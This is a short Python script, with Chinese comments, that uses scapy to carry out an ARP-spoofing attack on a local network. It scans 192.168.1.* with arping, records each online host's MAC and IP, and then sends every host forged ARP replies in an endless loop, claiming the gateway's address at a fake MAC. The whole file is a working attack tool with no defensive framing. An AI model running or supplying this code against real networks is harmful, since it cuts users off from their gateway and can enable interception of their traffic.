#coding:utf-8
'''
arp欺骗局域网pc，将伪造的网关mac以网关的arp应答发送给pc
'''
from scapy.all import ARP,send,arping
import sys,re

stdout=sys.stdout
IPADDR="192.168.1.*"
gateway_ip='192.168.1.1'
#伪造网关mac地址
gateway_hw='00:11:22:33:44:55'
p=ARP(op = 2,hwsrc = gateway_hw,psrc = gateway_ip)

def arp_hack(ip,hw):
    #伪造来自网关的arp应答
    t=p
    t.hwdst=hw
    t.pdst=ip
    send(t)

def get_host():
    #得到在线主机的mac地址和对应ip地址 
    hw_ip = {}
    sys.stdout = open('host.info','w')
    arping(IPADDR)
    sys.stdout = stdout
    f = open('host.info','r')
    info = f.readlines()
    f.close
    del info[0]
    del info[0]
    for host in info :
        temp = re.split(r'\s+',host)
        hw_ip[temp[1]] = temp[2]
        
    return hw_ip
        
    

if __name__ == "__main__":
    hw_ip = get_host()
    while 1 :
        for i in hw_ip :
            arp_hack(hw=i,ip=hw_ip[i])